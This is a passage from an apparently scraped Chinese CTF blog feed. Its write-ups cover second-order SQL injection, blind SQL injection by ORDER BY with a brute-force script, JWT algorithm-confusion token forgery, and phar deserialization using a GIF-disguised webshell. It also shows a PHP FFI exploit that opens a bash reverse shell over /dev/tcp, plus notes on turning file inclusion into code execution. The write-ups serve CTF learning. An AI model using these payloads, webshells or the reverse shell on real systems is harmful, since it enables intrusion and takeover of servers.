3</h1><p>考察二次注入：该题能够使用二次注入就是发现修改密码处的显示未转义的username<br>该题与<strong>sqlilabs_less24</strong>相同<br>后端注册代码<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>对用户名密码<code>mysql_escape_string</code>转义</p><pre><code class="hljs css">注册<span class="hljs-selector-pseudo">:username</span><span class="hljs-selector-pseudo">:admin</span>’#<span class="hljs-selector-tag">password</span><span class="hljs-selector-pseudo">:zxasqw159</span></code></pre><p>发现插入数据库中的数据并为在单引号前加<code>”\”</code>，存入数据库将单引号吃掉。<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>因为登录时候<strong>login.php</strong>会对用户密码转义，无法成功使用<code>”admin’#”</code>以<code>admin</code>帐号登录。<br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><p>可以通过修改密码处。使用admin’#帐号进行登录。再进行密码修改，用户名为<code>Session[‘username’]</code>中取出即为<code>”admin’#”</code></p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin’<span class="hljs-meta">#</span><span class="hljs-symbol">curr_pass:</span>zxasqw159<span class="hljs-symbol">pass:</span><span class="hljs-number">123456</span><span class="hljs-symbol">repass:</span><span class="hljs-number">123456</span></code></pre><p><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p>UPDATE处的语句就为</p><pre><code class="hljs routeros">UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">'123456'</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">'admin'</span>#' <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">'zxasqw159'</span></code></pre><p>成功将<code>admin</code>密码修改为<code>123456</code><br>登录即可得到Flag<br><img src="./14.png" srcset="/img/loading.gif" alt=""><br>解决该题二次注入<br>第一种：插入数据时使用： <code>str_replace(&quot;\\&quot;, &quot;\\\\&quot;);</code><br>第二种：修改密码前对用户名转义</p><h1 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h1><p><img src="./15.png" srcset="/img/loading.gif" alt=""><br>parse_str解析url之后存在变量覆盖，构造<code>sha256($hash_key=1)=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</code></p><pre><code class="hljs groovy"><span class="hljs-string">Payload:</span><span class="hljs-string">http:</span><span class="hljs-comment">//39.100.83.188:8066/?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1</span></code></pre><p><img src="./16.png" srcset="/img/loading.gif" alt=""></p><h1 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h1><pre><code class="hljs autoit">过滤括号，-，@、<span class="hljs-literal">and</span>、<span class="hljs-built_in">sleep</span>、extractvalue..字符</code></pre><p>使用<strong>order by 盲注</strong><br><code>order by</code>排序规律是以字节码进行排序<br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><p>具体参考<a href="https://p0sec.net/index.php/archives/106/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/106/</a><br>只要每一位字符小于或相等，整体字符串字节码最小的那个字段会排序在第一个位置。<br><img src="./18.png" srcset="/img/loading.gif" alt=""><br>按照以上思路，有如下逻辑</p><pre><code class="hljs crystal">字符字节码小于或相等-&gt;回显<span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 中第二列内容。</span>字符字节码不相等-&gt;回显union_373_Tom!</code></pre><p><strong>这里需要注意的是，因为小于也会使得字段排在第一位。</strong><br>所以需要找到最大的每一位使之与union_373_Tom!的密码每一位相同。<br><img src="./19.png" srcset="/img/loading.gif" alt=""></p><p>python脚本</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringstr1=<span class="hljs-string">"_"</span>+string.lowercase[::-<span class="hljs-number">1</span>]+<span class="hljs-string">'987654321'</span><span class="hljs-comment">//另Ascii值最大排在最前</span>passwd=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> j <span class="hljs-built_in">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> str1:<span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'union_373_Tom'</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">"1' or '1'   union select  1,2,"</span>+<span class="hljs-string">"'"</span>+passwd+i+<span class="hljs-string">"' from admin order by  3,'1"</span>&#125;header=&#123;<span class="hljs-string">'User-Agent'</span>:<span class="hljs-string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.28 Safari/537.36 Union.373"</span>&#125;url=<span class="hljs-string">"http://39.100.83.188:8054"</span>r=requests.post(url=url,headers=header,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)r.encoding=<span class="hljs-string">'utf-8'</span># print(<span class="hljs-keyword">data</span>)<span class="hljs-keyword">if</span> <span class="hljs-string">'2!'</span> <span class="hljs-built_in">in</span> r.<span class="hljs-keyword">text</span>:passwd=passwd+iprint(passwd)break</code></pre><p>运行脚本得到flag<br><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h1 id="WEB-6"><a href="#WEB-6" class="headerlink" title="WEB 6"></a>WEB 6</h1><p>登录网页login，服务端response一串json。其中似乎能利用只有token。<br><img src="./21.png" srcset="/img/loading.gif" alt=""><br>对token进行解码，发现是使用jwt生成Token。<br><img src="./22.png" srcset="/img/loading.gif" alt=""></p><p>访问jwt.io官网得知，base64解码之后的格式是以三部分形式<br>Header头部带有加密方式alg:RS256,类型typ:”JWT”<br><img src="./23.png" srcset="/img/loading.gif" alt=""><br>Payload带有用户信息<br><img src="./24.png" srcset="/img/loading.gif" alt=""><br>签名字段使用RSASHA256分别对header、payload、secret进行加密。且RSASHA256为非对称加密需要公钥与私钥进行解密<br><img src="./25.png" srcset="/img/loading.gif" alt=""><br>查找前端源码，<a href="http://39.100.83.188:8053/static/js/common.js" target="_blank" rel="noopener">http://39.100.83.188:8053/static/js/common.js</a><br>处发现ajax请求，验证头部身份认证。验证成功弹出文件路径。猜测需要构造admin Token进而得到admin的data.links</p><p><img src="./26.png" srcset="/img/loading.gif" alt=""><br>在源码底部发现公钥公钥获取方式<br><img src="./27.png" srcset="/img/loading.gif" alt=""><br>访问url<a href="http://39.100.83.188:8053/pubkey/7f4986d640c32e7ee1c7a8297b62c4ee得到公钥需要对里面的换行字符”\n”剔除" target="_blank" rel="noopener">http://39.100.83.188:8053/pubkey/7f4986d640c32e7ee1c7a8297b62c4ee得到公钥需要对里面的换行字符”\n”剔除</a></p><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> PUBLIC KEY<span class="hljs-params">-----</span>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PKomh6laVF+c3+D+klIjXglj7+<span class="hljs-string">/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h</span>Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtucIC+LX+9V/mpyKe9R3wIDAQAB<span class="hljs-params">-----END</span> PUBLIC KEY<span class="hljs-params">-----</span></code></pre><p>因为服务端发送的token采用RSA256加密方式，需要公钥与私钥。但我们无法获取私钥。猜测后端解密方式是通过HEADER头部alg字段进行解密验证。</p><pre><code class="hljs processing">python脚本如下<span class="hljs-keyword">import</span> jwt<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">public</span> =<span class="hljs-string">"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FETVJUek05dWprSG1oNDJhWEcwYUhaay9QSwpvbWg2bGFWRitjMytEK2tsSWpYZ2xqNysvd3huenRuaHlPWnBZeGR0azdGZnBIYTNYaDRQa3BkNVZpdndPdTFoCktrM1hRWVplTUhvdjRrVzB5dVMrNVJwRlYxUTJnbS9OV0dZNTJFYVFtcENORlFiR05pZ1podTk1UjJPb010dWMKSUMrTFgrOVYvbXB5S2U5UjN3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ=="</span><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">"name"</span>: <span class="hljs-string">"iscc19"</span>,<span class="hljs-string">"priv"</span>: <span class="hljs-string">"admin"</span>&#125;, <span class="hljs-built_in">key</span>=base64.b64decode(<span class="hljs-keyword">public</span>), algorithm=<span class="hljs-string">'HS256'</span>))</code></pre><p>运行时候需要对algorithms.py中prepare_key中非法字符注释，否则程序报错。<br><img src="./28.png" srcset="/img/loading.gif" alt=""><br>运行py获得字符串</p><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJuYW<span class="hljs-number">1</span>lIjoiaX<span class="hljs-symbol">NjYzE5</span>IiwicHJpdiI<span class="hljs-number">6</span>ImFkbWluI<span class="hljs-symbol">n0</span>.bEza<span class="hljs-number">2</span>gXi<span class="hljs-number">7</span>_q<span class="hljs-number">9</span>qPFTSgbu<span class="hljs-number">8</span>wWRpmHqHd<span class="hljs-number">1</span>FFa-rJKY_<span class="hljs-number">38</span>c</code></pre><p>带入即可获取admin信息<br><img src="./29.png" srcset="/img/loading.gif" alt=""><br>访问<a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277获得flag" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277获得flag</a><br><img src="./30.png" srcset="/img/loading.gif" alt=""></p><p>参考链接：<a href="https://www.anquanke.com/post/id/145540#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540#h2-3</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化学习之phar攻击</title>
    <link href="/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/"/>
    <url>/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p><h1 id="Phar定义"><a href="#Phar定义" class="headerlink" title="Phar定义"></a>Phar定义</h1><p>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file:// php://</code>等类似，也是一种流包装器。<br>phar结构由 4 部分组成</p><blockquote><p>stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；<br>manifest 压缩文件的属性等信息，以<strong>序列化</strong>存储；<br>contents 压缩文件的内容；<br>signature 签名，放在文件末尾；</p></blockquote><p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><code>Phar://</code>协议流只要出现phar标识头就会解析，所以我们可以直接改成gif格式文件<br>根据上述poc创建出poc1.gif上传后，通过<code>file_exists</code>触发文件反序列化</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myclass</span></span>&#123;</span><span class="php">    <span class="hljs-keyword">var</span>  $output=<span class="hljs-string">'@eval($_GET["a"]);'</span>;</span><span class="php">    </span><span class="php">&#125;</span><span class="php">$o=<span class="hljs-keyword">new</span> Myclass();</span><span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span><span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span><span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span><span class="php">$phar-&gt;startBuffering();</span><span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span><span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span><span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span><span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>代码<strong>第40行</strong>进行反序列化，回溯到<strong>第9行</strong>是对<code>user</code>类进行反序列化。<br>通读代码可知需要构造反序列化Admin类触发<code>__destruct</code>，执行<code>create_function</code>创建匿名函数，通过<code>$_GET[‘lucky’]()</code>执行匿名函数得到Flag.</p><p><code>$data</code>通过<code>cookie</code>传入，可控。但是在<code>check_session()</code>方法对<code>$data</code>进行hash验证。很显然我们得不到<code>secret</code>。</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>看来伪照<code>$data</code>无果，看到<code>upload()</code>方法有<code>file_get_contents</code>方法，由文章开头可知该方法可以触发phar反序列化。<br>我们可以通过<code>$_GET[‘url’]</code>借助<code>vps</code>上传<code>avatar.gif</code>，Poc构造如下</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123; </span><span class="php">    <span class="hljs-keyword">public</span> $avatar; </span><span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-string">'随便填'</span>; </span><span class="php">    &#125; </span><span class="php">&#125; </span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123; </span><span class="php">&#125; </span><span class="php">$o=<span class="hljs-keyword">new</span> Admin();</span><span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span><span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span><span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span><span class="php">$phar-&gt;startBuffering();</span><span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span><span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span><span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span><span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>接下来就是执行怎样通过<code>$_GET[‘lucky’]</code>执行匿名函数问题。</p><p>源码分析匿名函数具体见我一篇文章：create_function任意代码执行</p><p>那么怎样才能得到匿名函数名，可以参考： <code>Apache的三种MPM模式比较：prefork，worker，event</code>。当用户请求过大时，超过 apache 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p><p>将生成的 <strong>poc1.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong>，然后将文件上传到题目服务器上：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=http:/</span><span class="hljs-regexp">/VPS_IP/</span></code></pre><p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=phar:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>data<span class="hljs-regexp">/$SANDBOX/</span>&amp;lucky=%<span class="hljs-number">00</span>lambda_</code></pre><h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><pre><code class="hljs routeros"><span class="hljs-comment"># coding: UTF-8</span><span class="hljs-comment"># Author: orange@chroot.org</span><span class="hljs-comment"># </span>import requestsimport socketimport time<span class="hljs-keyword">from</span> multiprocessing.dummy import<span class="hljs-built_in"> Pool </span>as ThreadPooltry:    requests.packages.urllib3.disable_warnings()except:    passdef <span class="hljs-builtin-name">run</span>(i):    <span class="hljs-keyword">while</span> 1:        HOST = <span class="hljs-string">'127.0.0.1'</span>       <span class="hljs-built_in"> PORT </span>= 80        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((HOST, PORT))        s.sendall(<span class="hljs-string">'GET / HTTP/1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n'</span>)        # s.close()        <span class="hljs-builtin-name">print</span> <span class="hljs-string">'ok'</span>        time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).<span class="hljs-builtin-name">get</span>(0xffff)</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/column/198945.html" target="_blank" rel="noopener">PHP反序列化入门之phar</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">My-CTF-Web-Challenges</a><br><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由phpggc理解php反序列化漏洞</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCTF | nextphp题解</title>
    <link href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>福大的一题ctf，学习一波</p><h1 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h1><p>进入网页直接显示eval函数</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;</span><span class="php">        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);</span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php">        show_source(<span class="hljs-keyword">__FILE__</span>);</span><span class="php">&#125;</span></code></pre><p>查看<code>phpinfo(),disable_functions</code>几乎禁用了所以可利用的函数<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>open_basedir控制访问路径<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="使用glob协议读到文件"><a href="#使用glob协议读到文件" class="headerlink" title="使用glob协议读到文件"></a>使用<code>glob</code>协议读到文件</h2><p><code>http://nextphp.2019.rctf.rois.io/?a=if ( $b = opendir(&quot;glob:///var/www/html/*php&quot;) ) {while ( ($file = readdir($b)) !== false ) {echo &quot;filename:&quot;.$file.&quot;\n&quot;;}closedir($b);}</code></p><p><strong>index.php preload.php</strong></p><p><code>http://nextphp.2019.rctf.rois.io/?a=if ( $b = opendir(&quot;glob:///*&quot;) ) {while ( ($file = readdir($b)) !== false ) {echo &quot;filename:&quot;.$file.&quot;\n&quot;;}closedir($b);}</code></p><p><strong>/下存在flag文件</strong></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h2 id="利用include-伪协议读取preload-php文件"><a href="#利用include-伪协议读取preload-php文件" class="headerlink" title="利用include+伪协议读取preload.php文件"></a>利用include+伪协议读取preload.php文件</h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><span class="php">    <span class="hljs-keyword">protected</span> $data = [</span><span class="php">        <span class="hljs-string">'ret'</span> =&gt; <span class="hljs-keyword">null</span>,</span><span class="php">        <span class="hljs-string">'func'</span> =&gt; <span class="hljs-string">'*'</span>,</span><span class="php">        <span class="hljs-string">'arg'</span> =&gt; <span class="hljs-string">''</span></span><span class="php">    ];</span><span class="php">    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> <span class="hljs-params">()</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">'ret'</span>] = <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">'func'</span>](<span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">'arg'</span>]);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span><span class="hljs-params">()</span>: <span class="hljs-title">array</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span><span class="hljs-params">(array $data)</span> </span>&#123;</span><span class="php">        array_merge(<span class="hljs-keyword">$this</span>-&gt;data, $data);</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;run();</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> <span class="hljs-params">()</span>: <span class="hljs-title">string</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span><span class="hljs-params">($payload)</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;data = unserialize($payload);</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;run();</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span> <span class="hljs-params">($key)</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[$key];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span> <span class="hljs-params">($key, $value)</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-keyword">Exception</span>(<span class="hljs-string">'No implemented'</span>);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span> <span class="hljs-params">()</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-keyword">Exception</span>(<span class="hljs-string">'No implemented'</span>);</span><span class="php">    &#125;</span><span class="php">&#125;</span></code></pre><p>是一个自定义序列化的类.通过通过文件名字<code>preload.php</code>查找<code>php7.4</code>预加载。<br>发现<code>php7.4</code>可以利用<code>php.ini</code>开启<code>opcache</code>预加载。</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>搜索<code>phpinfo</code>，发现<code>preload.php</code>预加载<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>在末尾看到警示，若加载了<code>ext/FFI</code>会造成危险。该题改期了ffi扩展。<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>查找<code>FFI</code>扩展可利用点。利用该扩展会调用系统共享库。和<code>0CTF LD_PRELOAD</code>系统劫持有异曲同工之妙。</p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p><code>FFI API</code>仅能适用于预加载文件，该题<code>preload.php</code>恰好符合该条件。</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p><code>FFI:cdef()</code>静态方法能够调用c函数。第二个参数调用的共享库可不写<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>根据run()方法创建的调用方式，<code>FFI:cdef(“int system(const char *command);”)</code>被放置于<code>data[‘ret’]</code>中。<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs routeros">nextphp.2019.rctf.rois.io/?<span class="hljs-attribute">a</span>=var_dump(unserialize('C:1:"A":95:&#123;a:3:&#123;s:3:<span class="hljs-string">"ret"</span>;N;s:4:<span class="hljs-string">"func"</span>;s:9:<span class="hljs-string">"FFI::cdef"</span>;s:3:<span class="hljs-string">"arg"</span>;s:32:<span class="hljs-string">"int system(const char *command);"</span>;&#125;&#125;<span class="hljs-string">')-&gt;__serialize()[ret]-&gt;system("bash -c '</span>/bin/bash -i &gt;&amp; /dev/tcp/ip<span class="hljs-built_in">/port </span>0&gt;&amp;1<span class="hljs-string">'"));</span></code></pre><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>反弹shell得到Flag</p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LFItoRCE总结</title>
    <link href="/2019/05/14/LFItoRCE%E6%80%BB%E7%BB%93/"/>
    <url>/2019/05/14/LFItoRCE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="系统文件"><a href="#系统文件" class="headerlink" title="系统文件"></a>系统文件</h2><p><strong>/proc/self/environ | /proc/self/fd/… | /var/log/…</strong><br>都可写入一句话，但是需要有读权限</p><h2 id="session-webshell"><a href="#session-webshell" class="headerlink" title="session webshell"></a>session webshell</h2><p>可能的Seesion保存路径</p><pre><code class="hljs crystal">/var/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">php</span>/<span class="hljs-title">session</span>/ (<span class="hljs-title">PHP</span> <span class="hljs-title">Sessions</span>) ，/<span class="hljs-title">tmp</span>/ (<span class="hljs-title">PHP</span> <span class="hljs-title">Sessions</span>)</span></code></pre><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>notebook<br>访问robots.txt得到文件名/php1nFo.php<br>分析ＵＲＬ:<strong><a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=php&amp;file=login" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=php&amp;file=login</a></strong><br>一波乱fuzz，发现访问?module=&amp;file=login.php可以直接访问，但是不能任意文件读取．<br>题目提示文件包含phpinfo<br>访问：<strong><a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=&amp;file=php1nFo.php" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=&amp;file=php1nFo.php</a></strong></p><pre><code class="hljs awk">open_basedir做了限制只能访问<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>:<span class="hljs-regexp">/tmp/</span>var<span class="hljs-regexp">/www/</span>html<span 